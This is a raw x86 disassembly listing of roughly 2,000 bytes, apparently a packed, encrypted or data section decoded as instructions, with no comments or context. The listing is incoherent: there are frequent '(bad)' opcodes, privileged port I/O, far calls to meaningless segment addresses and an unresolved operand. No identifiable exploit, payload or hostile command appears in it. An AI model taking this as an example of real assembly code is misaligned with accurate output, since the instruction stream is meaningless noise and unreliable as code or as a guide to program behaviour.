  417403:	and    BYTE PTR es:[edi-0x8accab5],dl
  41740a:	xor    al,0x42
  41740c:	out    0x70,eax
  41740e:	pop    ecx
  41740f:	loopne 0x4173a0
  417411:	imul   ebp,DWORD PTR [edx-0x21],0xfffffff0
  417415:	(bad)  
  417416:	mov    ebp,0x47ee81a9
  41741b:	mov    ds:0x812c0c79,al
  417420:	sub    al,0x9
  417422:	mov    bh,0x61
  417424:	cwde   
  417425:	jecxz  0x417463
  417427:	push   edx
  417428:	lock cld 
  41742a:	test   al,0x9e
  41742c:	inc    edx
  41742d:	mov    ebp,ecx
  41742f:	(bad)  
  417430:	pop    eax
  417431:	data16 jl 0x41743f
  417434:	imul   ecx,DWORD PTR ds:0xf9d8975f,0xa818daae
  41743e:	dec    esp
  41743f:	inc    edi
  417440:	jno    0x41740f
  417442:	fcmovbe st,st(4)
  417444:	scas   eax,DWORD PTR es:[edi]
  417445:	add    dh,BYTE PTR [ebx-0x18289b39]
  41744b:	inc    ebp
  41744c:	je     0x417413
  41744e:	and    dh,BYTE PTR [eax+ecx*2+0x4d]
  417452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417453:	es push 0x2c
  417456:	xchg   ecx,eax
  417457:	ja     0x417409
  417459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41745a:	mov    dh,0x5d
  41745c:	cs call 0xfc1d:0x90ca100b
  417464:	out    dx,eax
  417465:	xchg   ebx,eax
  417466:	(bad)  
  417467:	cli    
  417468:	fs sbb bh,0x63
  41746c:	fcmovnbe st,st(0)
  41746e:	add    al,BYTE PTR [edi-0x70cf48b]
  417474:	and    DWORD PTR [edi+esi*4],eax
  417477:	cli    
  417478:	and    BYTE PTR [ebx-0x47],al
  41747b:	enter  0xb8a1,0xd4
  41747f:	mov    esp,0x44236318
  417484:	arpl   WORD PTR [eax],si
  417486:	xor    al,0xa3
  417488:	pop    edx
  417489:	mov    ds:0xf4aaae41,eax
  41748e:	and    dh,BYTE PTR [edx]
  417490:	mov    eax,DWORD PTR [ebp+eax*1+0x29]
  417494:	and    DWORD PTR [ebx-0x15],0x122c27fd
  41749b:	xlat   BYTE PTR ds:[ebx]
  41749c:	xor    ch,cl
  41749e:	outs   dx,BYTE PTR ds:[esi]
  41749f:	or     ecx,DWORD PTR ds:0x6432476
  4174a5:	sub    esp,DWORD PTR [ecx]
  4174a7:	test   eax,0x2d664065
  4174ac:	sahf   
  4174ad:	mov    dl,0x6f
  4174af:	fld    DWORD PTR [edi]
  4174b1:	mov    esi,0xe3890217
  4174b6:	test   DWORD PTR [ebx],ecx
  4174b8:	sub    DWORD PTR [ecx],0x59
  4174bb:	xchg   ebp,eax
  4174bc:	jns    0x417445
  4174be:	in     eax,0x3
  4174c0:	out    0x49,al
  4174c2:	jl     0x417480
  4174c4:	stos   BYTE PTR es:[edi],al
  4174c5:	and    al,0xe3
  4174c7:	sub    BYTE PTR [esi+0x59c91802],cl
  4174cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174ce:	push   es
  4174cf:	inc    esp
  4174d0:	add    BYTE PTR [ecx],ah
  4174d2:	cwde   
  4174d3:	sub    BYTE PTR [edx],cl
  4174d5:	push   cs
  4174d6:	mov    al,ds:0xdfbc8594
  4174db:	je     0x4174f5
  4174dd:	int3   
  4174de:	adc    DWORD PTR [ebp+esi*8+0x78],0xf8f51272
  4174e6:	stos   DWORD PTR es:[edi],eax
  4174e7:	push   ebx
  4174e8:	mov    ebx,0xee0ed53
  4174ed:	retf   0x42e1
  4174f0:	fst    DWORD PTR [edi]
  4174f2:	ins    BYTE PTR es:[edi],dx
  4174f3:	dec    esp
  4174f4:	inc    ebx
  4174f5:	and    DWORD PTR [esi],edi
  4174f7:	add    eax,0x7574e736
  4174fc:	imul   ebx,DWORD PTR [ebx],0x19
  4174ff:	cli    
  417500:	loop   0x4174e6
  417502:	cmc    
  417503:	sub    eax,0xb4db3d20
  417508:	test   al,0x51
  41750a:	ss push ds
  41750c:	sbb    DWORD PTR [esp+esi*1-0x16ba5c65],edi
  417513:	(bad)  
  417514:	or     al,0xc3
  417516:	mov    dl,0xe8
  417518:	bound  edi,QWORD PTR ds:0x1a662052
  41751e:	pop    ebp
  41751f:	mov    ds:0x5c6e5b48,eax
  417524:	cmp    DWORD PTR [eax-0x5f],ecx
  417527:	(bad)  
  417528:	imul   esi,DWORD PTR [edx],0xffffffbf
  41752b:	xor    BYTE PTR [ebx],0x69
  41752e:	scas   al,BYTE PTR es:[edi]
  41752f:	sbb    eax,0x8536e94c
  417534:	leave  
  417535:	jmp    0x20eba0bd
  41753a:	in     al,0x2d
  41753c:	dec    esi
  41753d:	xor    eax,0xcf564acf
  417542:	repnz mov dh,0xdf
  417545:	cmp    DWORD PTR [esi],ebp
  417547:	rol    BYTE PTR [ecx],cl
  417549:	mov    eax,0xc2b5a50e
  41754e:	call   0xc111:0x65ba10f8
  417555:	imul   ebp,DWORD PTR [edx],0x62
  417558:	ror    BYTE PTR ds:0xe2ba66cd,1
  41755e:	mov    esp,0xa8636a0
  417563:	adc    al,0xed
  417565:	mov    ebx,0xf4ce3601
  41756a:	add    eax,0xd79441bd
  41756f:	add    al,0x2b
  417571:	(bad)  
  417572:	retf   0xa8bc
  417575:	sbb    al,0x32
  417577:	xor    bh,0xd0
  41757a:	add    al,0xcf
  41757c:	std    
  41757d:	adc    ecx,DWORD PTR [ebp-0x1b]
  417580:	push   cs
  417581:	or     ebx,esi
  417583:	xadd   ah,ah
  417586:	jns    0x4175ab
  417588:	or     al,0xb7
  41758a:	mov    ch,0xcf
  41758c:	sbb    BYTE PTR [ebx+0x48376631],ch
  417592:	pop    ebp
  417593:	mov    ebx,0xcb98297c
  417598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417599:	dec    ebp
  41759a:	mov    BYTE PTR [edx],0xde
  41759d:	pop    es
  41759e:	sahf   
  41759f:	das    
  4175a0:	adc    ecx,DWORD PTR [ecx-0x2b37d062]
  4175a6:	add    eax,0x8129d916
  4175ab:	inc    eax
  4175ac:	repz addr16 dec esp
  4175af:	push   ebp
  4175b0:	stos   BYTE PTR es:[edi],al
  4175b1:	cmp    eax,0xb1632117
  4175b6:	loope  0x4175ac
  4175b8:	push   edi
  4175b9:	and    BYTE PTR [esi-0x368510d7],ch
  4175bf:	cmc    
  4175c0:	movhps xmm6,QWORD PTR fs:[di]
  4175c5:	pop    ebx
  4175c6:	push   es
  4175c7:	fild   QWORD PTR [eax+ecx*2+0x42e72d66]
  4175ce:	cli    
  4175cf:	push   esp
  4175d0:	dec    ebx
  4175d1:	out    dx,al
  4175d2:	pop    es
  4175d3:	into   
  4175d4:	adc    cl,BYTE PTR [eax+0x29c8c648]
  4175da:	scas   al,BYTE PTR es:[edi]
  4175db:	stos   DWORD PTR es:[edi],eax
  4175dc:	cmp    BYTE PTR [edx-0x6e],cl
  4175df:	mov    ecx,0x3d639f1f
  4175e4:	mov    ebp,0xb6847ab3
  4175e9:	iret   
  4175ea:	sete   BYTE PTR [esi+0x1f7b2b16]
  4175f1:	cmc    
  4175f2:	pop    ds
  4175f3:	aam    0xf2
  4175f5:	test   DWORD PTR [ecx+eax*2],ebx
  4175f8:	cmp    dl,ah
  4175fa:	inc    ebx
  4175fb:	fdiv   st,st(4)
  4175fd:	stos   BYTE PTR es:[edi],al
  4175fe:	mov    ds:0x760c0ce4,al
  417603:	test   eax,0x5d95f388
  417608:	inc    esp
  417609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41760a:	adc    DWORD PTR [ecx+0x5d285205],eax
  417610:	push   ebp
  417611:	inc    esi
  417612:	ins    DWORD PTR es:[edi],dx
  417613:	push   edi
  417614:	call   0x20f9:0xb7869f8
  41761b:	in     al,0x2e
  41761d:	les    ebp,FWORD PTR [esi+eax*8]
  417620:	ficomp DWORD PTR ds:0x5a5a3364
  417626:	repnz mov dh,0x54
  417629:	or     BYTE PTR [eax-0x34c54b8],cl
  41762f:	loop   0x417621
  417631:	sbb    ecx,DWORD PTR [eax-0x51e855ae]
  417637:	nop
  417638:	mov    edx,0x1103d36c
  41763d:	xchg   BYTE PTR [edx+0x5406565c],ah
  417643:	call   0x4dd01b7
  417648:	repnz pushf 
  41764a:	xchg   esp,eax
  41764b:	jno    0x41763d
  41764d:	push   ebp
  41764e:	and    eax,DWORD PTR [ebp-0x28]
  417651:	xchg   cl,bh
  417653:	jecxz  0x41769d
  417655:	mov    bh,0x76
  417657:	sbb    al,0x71
  417659:	retf   
  41765a:	and    al,0x2c
  41765c:	sub    esp,ebx
  41765e:	arpl   WORD PTR [esi+0x2d],bp
  417661:	mov    dh,0x53
  417663:	pop    ds
  417664:	lds    eax,FWORD PTR ds:0xa574e9a4
  41766a:	ja     0x417695
  41766c:	loop   0x417620
  41766e:	mov    bh,0x1d
  417670:	push   0x5a
  417672:	ret    
  417673:	mov    DWORD PTR [edi],ebx
  417675:	outs   dx,DWORD PTR ds:[esi]
  417676:	rol    DWORD PTR [ecx+0x25],1
  417679:	add    eax,0xde82369f
  41767e:	sub    al,0xef
  417680:	xor    ah,ah
  417682:	mov    ebp,0x954ac18b
  417687:	ins    DWORD PTR es:[edi],dx
  417688:	push   esp
  417689:	sahf   
  41768a:	std    
  41768b:	sbb    eax,0xc7ced79c
  417690:	push   cs
  417691:	dec    edi
  417692:	dec    edx
  417693:	mov    edx,0xe66e5c98
  417698:	(bad)  [ecx]
  41769a:	xchg   edi,eax
  41769b:	add    al,0x1f
  41769d:	mov    WORD PTR ds:0xc160146a,ds
  4176a3:	mov    esi,0x201feac6
  4176a8:	lods   al,BYTE PTR ds:[esi]
  4176a9:	mov    esp,0x52b84c20
  4176ae:	cmp    DWORD PTR [ebx-0x2d],edx
  4176b1:	dec    edi
  4176b2:	pusha  
  4176b3:	call   FWORD PTR [ebx+0x77]
  4176b6:	ss sub eax,0x94ef8b6c
  4176bc:	bound  edi,QWORD PTR [ebp-0x71]
  4176bf:	xor    BYTE PTR [edi+0x4],ah
  4176c2:	push   esi
  4176c3:	xchg   ebx,eax
  4176c4:	shl    DWORD PTR [eax-0x1f04ee24],cl
  4176ca:	push   esp
  4176cb:	mov    ds:0x737a61f9,eax
  4176d0:	sub    esp,DWORD PTR [eax]
  4176d2:	(bad)  
  4176d3:	mov    dh,0x53
  4176d6:	sub    al,0x8f
  4176d8:	fcmovb st,st(7)
  4176da:	mov    eax,ds:0x4ec82162
  4176df:	push   esp
  4176e0:	pop    ss
  4176e1:	das    
  4176e2:	loopne 0x4176e1
  4176e4:	inc    edi
  4176e5:	leave  
  4176e6:	lods   al,BYTE PTR ds:[esi]
  4176e7:	clc    
  4176e8:	aad    0x54
  4176ea:	xor    BYTE PTR [ecx],0x3b
  4176ed:	push   esp
  4176ee:	inc    edi
  4176ef:	dec    eax
  4176f0:	loop   0x4176bf
  4176f2:	xchg   esp,eax
  4176f3:	jo     0x41767d
  4176f5:	lods   eax,DWORD PTR ds:[esi]
  4176f6:	out    0x57,eax
  4176f8:	adc    al,0xdc
  4176fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176fb:	(bad)  
  4176fc:	lahf   
  4176fd:	nop
  4176fe:	int    0x83
  417700:	ret    0x811d
  417703:	or     ch,BYTE PTR [edx+0x60]
  417706:	es js  0x4176d4
  417709:	inc    esp
  41770a:	(bad)  
  41770b:	rcr    DWORD PTR [ecx-0x54bda6dd],cl
  417711:	fisub  WORD PTR [ecx+esi*2-0x70]
  417715:	int3   
  417716:	loopne 0x417794
  417718:	add    BYTE PTR [edi-0x7d],0xb5
  41771c:	pop    eax
  41771d:	dec    edi
  41771e:	adc    al,0x2a
  417721:	outs   dx,DWORD PTR ds:[esi]
  417722:	dec    eax
  417723:	rol    BYTE PTR [edx],1
  417725:	mov    bh,0x80
  417727:	mov    ebx,0xd4f839a7
  41772c:	xchg   ebp,eax
  41772d:	stos   BYTE PTR es:[edi],al
  41772e:	fcomi  st,st(0)
  417730:	cmp    DWORD PTR [edx+0x37],0x2f7bc9f1
  417737:	mov    BYTE PTR [ebx],ah
  417739:	mov    ds:0xffb5976e,eax
  41773e:	sub    BYTE PTR [edi+0x22],bh
  417741:	mov    fs:0xebaad015,al
  417747:	xchg   BYTE PTR [bx+di-0x36],bl
  41774b:	fldcw  WORD PTR [edi-0x2d72c3e3]
  417751:	cmp    DWORD PTR ds:0xecd4c8bf,0xffffff8b
  417758:	xchg   ebx,edi
  41775a:	mov    ch,0xa4
  41775c:	shr    BYTE PTR [edi-0x33],cl
  41775f:	cs pop esp
  417761:	cdq    
  417762:	inc    ecx
  417763:	test   BYTE PTR [edx],0xc9
  417766:	call   0x1fc7f742
  41776b:	icebp  
  41776c:	out    0x14,eax
  41776e:	xchg   esi,eax
  41776f:	in     eax,0x75
  417771:	fisub  WORD PTR ds:0x1bb36304
  417777:	pushf  
  417778:	data16 mov dl,BYTE PTR ds:0x6a29d287
  41777f:	adc    esi,DWORD PTR [ecx-0x35c44921]
  417785:	(bad)  
  417786:	sbb    al,0xba
  417788:	scas   al,BYTE PTR es:[edi]
  417789:	(bad)  
  41778c:	add    ecx,DWORD PTR [eax]
  41778e:	pusha  
  41778f:	mov    ebx,0x1fcd520c
  417794:	inc    ebx
  417795:	sti    
  417796:	call   0x56342911
  41779b:	shl    BYTE PTR [ecx-0x8a58210],1
  4177a1:	cmp    DWORD PTR [ebx-0x5f],ecx
  4177a4:	dec    ebx
  4177a5:	adc    eax,eax
  4177a7:	pushf  
  4177a8:	mov    dl,0xf7
  4177aa:	and    al,0xd3
  4177ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ad:	aaa    
  4177ae:	ror    DWORD PTR [eax],cl
  4177b0:	outs   dx,WORD PTR ds:[esi]
  4177b2:	aaa    
  4177b3:	inc    ebp
  4177b4:	mov    ch,0x42
  4177b6:	mov    ebx,0x376d1f75
  4177bb:	mov    ecx,0x327298
  4177c0:	jmp    0x417cd2
  4177c5:	(bad)
  4177c8:	enter  0xcfc5,0xd5
  4177cc:	aad    0x91
  4177ce:	xor    eax,0xb40bf48d
  4177d3:	fcmovnb st,st(4)
  4177d6:	xlat   BYTE PTR ds:[ebx]
  4177d7:	jg     0x417851
  4177d9:	jae    0x417857
  4177db:	js     0x417855
  4177dd:	dec    edi
  4177de:	sbb    al,0xaf
  4177e0:	popa   
  4177e1:	lahf   
  4177e2:	retf   
  4177e3:	sbb    al,0xbb
  4177e5:	stos   DWORD PTR es:[edi],eax
  4177e6:	jmp    0x41781c
  4177e8:	data16 loop 0x41782d
  4177eb:	pop    ds
  4177ec:	into   
  4177ed:	lods   al,BYTE PTR ds:[esi]
  4177ee:	sub    esi,eax
  4177f0:	xchg   edi,eax
  4177f1:	mov    ds:0x68188958,al
  4177f6:	cdq    
  4177f7:	xchg   edx,eax
  4177f8:	ror    DWORD PTR [esp+esi*1-0x36],cl
  4177fc:	sbb    eax,0x7d4194fc
  417801:	lods   al,BYTE PTR ds:[esi]
  417802:	gs cwde 
  417804:	fsubr  QWORD PTR [ebp-0x37]
  417807:	push   ds
  417808:	add    bh,al
  41780a:	sub    DWORD PTR [eax-0x4084e57a],0xef38201c
  417814:	sub    DWORD PTR [edi+0x54766de7],eax
  41781a:	fisub  WORD PTR [ecx-0x1c5c3eac]
  417820:	enter  0xd5af,0xc3
  417824:	cmp    al,0xca
  417826:	mov    dh,0xa
  417828:	pop    esp
  417829:	jb     0x4178a5
  41782b:	jno    0x41788e
  41782d:	adc    al,0xd8
  41782f:	in     eax,0xae
  417831:	jb     0x417887
  417833:	into   
  417834:	(bad)  
  417835:	adc    BYTE PTR [edx+edi*2+0x48ecf4c7],bl
  41783c:	cwde   
  41783d:	mul    BYTE PTR [ecx-0x5134aea0]
  417843:	mov    ah,0x97
  417845:	mov    ds:0x277843f2,eax
  41784a:	jbe    0x417889
  41784c:	push   ebp
  41784d:	jne    0x417891
  41784f:	out    0xcb,al
  417851:	mov    eax,ds:0xd214689e
  417856:	push   ecx
  417857:	add    edx,edi
  417859:	or     DWORD PTR [esi+edx*2+0x3],eax
  41785d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41785e:	mov    al,0x3d
  417860:	mov    dl,0x5b
  417862:	mov    ch,0x94
  417864:	and    eax,0x1e2da34
  417869:	sti    
  41786a:	cmp    eax,0x248abcc8
  41786f:	aad    0x6
  417871:	fnstsw WORD PTR [edi+0x8a7877b]
  417877:	xlat   BYTE PTR ds:[ebx]
  417878:	pop    ds
  417879:	repnz inc esi
  41787b:	and    eax,0x98550d6f
  417880:	xchg   esp,eax
  417881:	and    eax,DWORD PTR [edi]
  417883:	mov    al,BYTE PTR [esi+0x739e3010]
  417889:	int    0xa5
  41788b:	in     al,0x5a
  41788d:	retf   0xd1cc
  417890:	push   DWORD PTR [ebp+0x1f]
  417893:	in     al,dx
  417894:	cs retf 
  417896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417897:	stos   DWORD PTR es:[edi],eax
  417898:	(bad)  
  417899:	xor    al,0xd4
  41789b:	jl     0x4178b1
  41789d:	inc    edi
  41789e:	lahf   
  41789f:	ins    BYTE PTR es:[edi],dx
  4178a0:	fwait
  4178a1:	adc    al,0x32
  4178a3:	hlt    
  4178a4:	add    cl,bh
  4178a6:	sub    dh,BYTE PTR [edi+esi*1+0x25]
  4178aa:	inc    edx
  4178ab:	test   al,0xcb
  4178ad:	xchg   edi,eax
  4178ae:	nop
  4178af:	push   0xffffff9b
  4178b1:	push   esp
  4178b2:	ror    eax,1
  4178b4:	test   DWORD PTR [eax-0x197dff80],edx
  4178ba:	add    dl,BYTE PTR [edx+eiz*1-0x2f]
  4178be:	pusha  
  4178bf:	jb     0x4178db
  4178c1:	lahf   
  4178c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c3:	mov    BYTE PTR [eax-0xb55d2d],dh
  4178c9:	mov    BYTE PTR [eax+edx*4-0x21],al
  4178cd:	js     0x41792d
  4178cf:	and    bl,BYTE PTR [esi+0x1fbaae7d]
  4178d5:	in     al,0xe4
  4178d7:	adc    DWORD PTR [ebx+0x11ebf1cb],eax
  4178dd:	dec    eax
  4178de:	fsub   DWORD PTR [edx+edx*8]
  4178e1:	add    BYTE PTR [ebp-0x7e],dl
  4178e4:	fwait
  4178e5:	in     al,0x9c
  4178e7:	in     eax,0x11
  4178e9:	xchg   edx,eax
  4178ea:	daa    
  4178eb:	adc    bl,dl
  4178ed:	push   0x32e8354
  4178f2:	mov    eax,0xdbfd1cc4
  4178f7:	lahf   
  4178f8:	mov    edi,DWORD PTR ds:0xf4a37dfb
  4178fe:	mov    ecx,0xaaadae67
  417903:	or     DWORD PTR [ebp-0x65a8cc4d],edi
  417909:	fdivr  QWORD PTR [ecx+0x34]
  41790c:	and    DWORD PTR [ecx],edx
  41790e:	mov    esp,0xe7cfd20b
  417913:	jae    0x417986
  417915:	pop    ss
  417916:	mov    edi,0x794b99cb
  41791b:	xchg   ebx,eax
  41791c:	ins    DWORD PTR es:[edi],dx
  41791d:	pushf  
  41791e:	add    al,0xe8
  417920:	lods   al,BYTE PTR ds:[esi]
  417921:	mov    esi,0xfb964d2d
  417926:	mov    ebx,0x66210ded
  41792b:	into   
  41792c:	js     0x4179a8
  41792e:	cdq    
  41792f:	push   edi
  417930:	bound  esp,QWORD PTR [eax-0x57]
  417933:	pop    es
  417934:	ins    BYTE PTR es:[edi],dx
  417935:	xor    eax,0x528ddffb
  41793a:	jbe    0x41791b
  41793c:	loop   0x4179a3
  41793e:	sub    BYTE PTR [edi+ecx*1+0x72],ah
  417942:	ss jae 0x417981
  417945:	inc    ebx
  417946:	jb     0x417947
  417948:	in     al,0x13
  41794a:	inc    eax
  41794b:	test   eax,0xa58ce7c9
  417950:	and    ecx,edi
  417952:	enter  0x5181,0x0
  417956:	pushf  
  417957:	jne    0x4178f3
  417959:	and    edx,ebp
  41795b:	jl     0x417944
  41795d:	jg     0x4179bd
  41795f:	retf   
  417960:	jnp    0x41791e
  417962:	mov    ecx,ecx
  417964:	loop   0x4178e9
  417966:	sub    eax,0xbf7e02a6
  41796b:	out    dx,al
  41796c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41796d:	lock test DWORD PTR [edi-0x36],esp
  417971:	imul   ebp,DWORD PTR [ecx],0x71
  417974:	xor    eax,ecx
  417976:	jle    0x41794e
  417978:	mov    DWORD PTR [edx+ecx*1+0x627947b3],esi
  41797f:	sub    DWORD PTR [eax],edi
  417981:	daa    
  417982:	lods   eax,DWORD PTR ds:[esi]
  417983:	cmp    eax,0x13fc8055
  417988:	in     eax,0x13
  41798a:	xchg   esi,eax
  41798b:	ja     0x4179ab
  41798d:	xor    ebp,ebx
  41798f:	das    
  417990:	fptan  
  417992:	es push esp
  417994:	xchg   edi,ecx
  417996:	rcr    BYTE PTR [eax-0x4e0f88e2],0xc9
  41799d:	jecxz  0x41799a
  41799f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179a0:	ins    DWORD PTR es:[edi],dx
  4179a1:	dec    esi
  4179a2:	push   cs
  4179a3:	loopne 0x417a1f
  4179a5:	into   
  4179a6:	adc    ah,BYTE PTR [eax-0x1c13ef3a]
  4179ac:	loop   0x417a0e
  4179ae:	sti    
  4179af:	jecxz  0x4179ac
  4179b1:	sub    DWORD PTR [edx],0xf7c668f6
  4179b7:	mov    esp,0x3717ce21
  4179bc:	aad    0xfb
  4179be:	gs jae 0x4179bd
  4179c1:	push   ss
  4179c2:	sbb    DWORD PTR [esp+edx*1],esp
  4179c5:	cmp    eax,0xf75ca198
  4179ca:	int3   
  4179cb:	add    ebp,edx
  4179cd:	cmp    esi,DWORD PTR [esi]
  4179cf:	dec    esi
  4179d0:	inc    esp
  4179d1:	pop    ss
  4179d2:	jmp    0xc17df310
  4179d7:	jp     0x417a16
  4179d9:	pop    es
  4179da:	pop    eax
  4179db:	popf   
  4179dc:	dec    esp
  4179dd:	mov    edx,0xcf1d04f9
  4179e2:	out    0xc8,al
  4179e4:	test   BYTE PTR [ebp+0xb389b41],al
  4179ea:	cmp    eax,0xb38927d3
  4179ef:	in     al,dx
  4179f0:	sbb    al,0x50
  4179f2:	stos   BYTE PTR es:[edi],al
  4179f3:	cwde   
  4179f4:	ret    0x1e27
  4179f7:	mov    eax,ds:0x40800ff1
  4179fc:	adc    DWORD PTR [eax-0x4a],edx
  4179ff:	mov    eax,esp
  417a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a02:	pop    ecx
  417a03:	mov    cl,0xfe
  417a05:	call   0x4e293d00
  417a0a:	popf   
  417a0b:	jne    0x4179d0
  417a0d:	xor    ecx,DWORD PTR [esi-0x21]
  417a10:	sub    eax,0x9f342159
  417a15:	jae    0x417a18
  417a17:	xor    esp,DWORD PTR ds:0xb02fc8a8
  417a1d:	sbb    al,0xc8
  417a1f:	(bad)  [esi+0x27]
  417a22:	pop    edx
  417a23:	lds    ebp,FWORD PTR [ebp+0x401edc88]
  417a29:	sbb    BYTE PTR [ebp+edx*2-0x33da04bd],bl
  417a30:	sbb    BYTE PTR [ebp+0x6e3b481a],ch
  417a36:	call   0x1768:0x9f6ce588
  417a3d:	dec    ecx
  417a3e:	xchg   esi,eax
  417a3f:	sub    eax,0x69c7416a
  417a44:	inc    esi
  417a45:	in     eax,dx
  417a46:	mov    cl,0x7a
  417a48:	outs   dx,DWORD PTR ds:[esi]
  417a49:	xchg   DWORD PTR [ecx+0x7f6bd34b],eax
  417a4f:	add    BYTE PTR [ebx],0x53
  417a52:	inc    edx
  417a53:	adc    BYTE PTR [ecx-0x44],0x75
  417a57:	jl     0x417a46
  417a59:	jecxz  0x417ad3
  417a5b:	ror    esp,1
  417a5d:	test   al,0xfb
  417a5f:	jns    0x4179eb
  417a61:	xchg   ebp,eax
  417a62:	xor    DWORD PTR [ebx+edi*2],esi
  417a65:	and    dl,dh
  417a67:	sub    BYTE PTR [eax+0x4c],ah
  417a6a:	dec    ebp
  417a6b:	mov    ?,ecx
  417a6d:	rcl    DWORD PTR [esi+esi*8+0x67586cfa],1
  417a74:	sbb    eax,0x4a16e262
  417a79:	push   ebp
  417a7a:	es aas 
  417a7c:	es mov bh,0x9e
  417a7f:	dec    edx
  417a80:	outs   dx,DWORD PTR ds:[esi]
  417a81:	jnp    0x417ad5
  417a83:	inc    edi
  417a84:	in     eax,dx
  417a85:	push   0xffffff83
  417a87:	lahf   
  417a88:	pop    esp
  417a89:	enter  0x7ceb,0x55
  417a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8e:	sbb    DWORD PTR [edx-0x2a],edi
  417a91:	fsub   DWORD PTR [edx+ebx*8-0x3]
  417a95:	cmp    edx,DWORD PTR [esi+0x6]
  417a98:	fsub   DWORD PTR [esi+esi*8+0x58e8d301]
  417a9f:	dec    esi
  417aa0:	inc    ebx
  417aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa2:	and    edi,DWORD PTR [ecx]
  417aa4:	sbb    dl,dh
  417aa6:	push   0x46
  417aa8:	cmp    ebx,DWORD PTR [esp+edx*2-0x79]
  417aac:	push   esi
  417aad:	test   BYTE PTR [edi+esi*2],0x33
  417ab1:	in     al,dx
  417ab2:	mov    DWORD PTR [esp+edx*2+0x6fb5e68c],esi
  417ab9:	cmp    BYTE PTR [eax+0x52],bl
  417abc:	and    edx,DWORD PTR [esi]
  417abe:	sub    ebp,DWORD PTR [ecx+0x3b89762]
  417ac4:	inc    esi
  417ac5:	cmp    BYTE PTR [ebp+0x770f0b68],ch
  417acb:	xchg   esi,eax
  417acc:	mov    dl,0x60
  417ace:	gs icebp 
  417ad0:	fcmovb st,st(1)
  417ad2:	scas   eax,DWORD PTR es:[edi]
  417ad3:	shl    DWORD PTR [esi+0x20cba233],1
  417ad9:	sub    eax,0xb9d0e620
  417ade:	stos   DWORD PTR es:[edi],eax
  417adf:	jg     0x417af1
  417ae1:	es inc ecx
  417ae3:	mov    edx,0x871eee04
  417ae8:	or     al,0xe2
  417aea:	ss cwde 
  417aec:	xchg   ebp,eax
  417aed:	in     al,0xaf
  417aef:	jae    0x417b6a
  417af1:	inc    ebx
  417af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af3:	or     eax,0x5acae3b0
  417af8:	icebp  
  417af9:	stos   DWORD PTR es:[edi],eax
  417afa:	xor    BYTE PTR [eax+0x3ee6e698],0x5
  417b01:	aaa    
  417b02:	jmp    FWORD PTR ds:[ecx-0x69ab77a]
  417b09:	mov    dh,0x8c
  417b0b:	sar    BYTE PTR [ebx-0x7759d1dc],0xdd
  417b12:	jne    0x417b7d
  417b14:	dec    edx
  417b15:	push   cs
  417b16:	pop    eax
  417b17:	out    0x99,eax
  417b19:	xor    al,0x7d
  417b1b:	pushf  
  417b1c:	les    ebx,FWORD PTR [edi+esi*1-0x76b487cc]
  417b23:	inc    ebp
  417b24:	add    al,0x30
  417b26:	mov    edx,0x4d596ac6
  417b2b:	xchg   ebx,eax
  417b2c:	daa    
  417b2d:	fwait
  417b2e:	bound  ecx,QWORD PTR [ecx]
  417b30:	push   ecx
  417b31:	rcr    BYTE PTR [ecx],0x27
  417b34:	adc    ch,bh
  417b36:	repz aaa 
  417b38:	mov    bh,0xbf
  417b3a:	and    bh,BYTE PTR [ebp-0x4276e8e9]
  417b40:	push   es
  417b41:	arpl   WORD PTR [ebx-0x21daff22],di
  417b47:	mov    bh,0xe3
  417b49:	call   0x4ae0b807
  417b4e:	imul   esp,DWORD PTR [edi+eiz*1+0x46],0x6f
  417b53:	xchg   edx,eax
  417b54:	adc    BYTE PTR [esi+0x4f],ch
  417b57:	(bad)  
  417b59:	pop    ds
  417b5a:	push   ebp
  417b5b:	xor    DWORD PTR [ebx-0x61],ecx
  417b5e:	or     esp,eax
  417b60:	dec    edi
  417b61:	mov    esi,0x4bfc2caf
  417b66:	cmp    eax,DWORD PTR [edx-0x53]
  417b69:	jo     0x417be6
  417b6b:	xor    BYTE PTR [esi+0x13],cl
  417b6e:	jno    0x417bd4
  417b70:	clc    
  417b71:	dec    ebp
  417b72:	ret    
  417b73:	dec    ebx
  417b74:	hlt    
  417b75:	div    DWORD PTR [ebx+edi*8+0x1a]
  417b79:	mov    BYTE PTR [esi],dl
  417b7b:	pop    esp
  417b7c:	xchg   ebp,eax
  417b7d:	dec    esp
  417b7e:	inc    esi
  417b7f:	inc    edx
  417b80:	pop    ebp
  417b81:	sbb    bh,BYTE PTR [edi-0x739cbbe5]
  417b87:	pop    ebp
  417b88:	mov    ebp,0x680d30d5
  417b8d:	cmp    al,0x5d
  417b8f:	or     eax,0xfecc99ec
  417b94:	adc    edx,DWORD PTR [ebp-0x362707fb]
  417b9a:	shr    DWORD PTR [ebx+0xe],0x4
  417b9e:	sti    
  417b9f:	jge    0x417bb0
  417ba1:	add    BYTE PTR [eax+0x3095ea06],ch
  417ba7:	test   al,0x2f
  417ba9:	mov    fs,ebx
  417bab:	(bad)
  417bae:	cmp    eax,0x909d83f6
  417bb3:	shr    BYTE PTR ds:0x26045ff0,1
  417bb9:	int    0x82
  417bbb:	cmp    eax,0x602420e5
  417bc0:	cmp    bl,BYTE PTR [edi]
  417bc2:	xor    ah,0x1e
  417bc5:	push   ss
  417bc6:	sbb    al,0x7
  417bc8:	inc    ebx
  417bc9:	sub    bh,BYTE PTR [edx]
  417bcb:	test   esi,esi
  417bcd:	scas   eax,DWORD PTR es:[edi]
  417bce:	pop    ds
  417bcf:	pop    ebx
  417bd0:	out    0xab,eax
  417bd2:	dec    ecx
  417bd3:	test   ch,cl
  417bd5:	push   ss
